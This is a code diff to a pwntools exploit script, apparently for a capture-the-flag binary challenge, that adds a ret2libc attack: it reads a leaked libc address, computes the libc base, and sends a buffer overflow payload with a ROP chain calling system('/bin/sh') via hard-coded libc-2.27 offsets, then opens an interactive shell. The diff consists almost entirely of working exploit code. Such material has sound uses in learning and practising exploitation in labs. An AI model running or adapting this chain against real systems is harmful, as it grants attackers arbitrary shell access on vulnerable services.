@@ -1,3 +1,4 @@
+import struct
 from pwn import *
 
 #env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc-2.27.so")}
@@ -137,7 +138,7 @@ def ret2csu(base_addr):
     #print(rop)
     return rop
 
-def pop_shell():
+def pop_shell_ret2csu():
     recd = p.recv()
     input()
     print(recd)
@@ -151,8 +152,31 @@ def pop_shell():
     p.sendline(payload)
     p.interactive()
 
+def pop_shell_system():
+    recd = p.recv()
+    input()
+    print(recd)
+    addr_str = recd.split(b'\n')[0]
+    print("Given libc addr ", addr_str)
+    given_addr = int(addr_str, 16)
+    base_addr = given_addr - 4111520 
+    payload = b'almond '
+    payload += b'A'*417
+    #strings -a -t x libc-2.27.so | grep bin
+    bin_sh_offset = 0x1b3e9a 
+    #objdump -d libc-2.27.so | grep "system"
+    system_function_offset = 0x4f440
+    #ROPgadget --binary libc-2.27.so > rops.txt
+    #grep "pop rdi ; ret" rops.txt
+    pop_rdi_ret_offset = 0x000000000002155f
+    payload += struct.pack('Q', base_addr + pop_rdi_ret_offset)
+    payload += struct.pack('Q', base_addr + bin_sh_offset)
+    payload += struct.pack('Q', base_addr + system_function_offset)
+    p.sendline(payload)
+    p.interactive()
+
 if __name__=='__main__':
     #A_smash()
     #cycle_rip()
     #check_cycle()
-    pop_shell()
+    pop_shell_system()
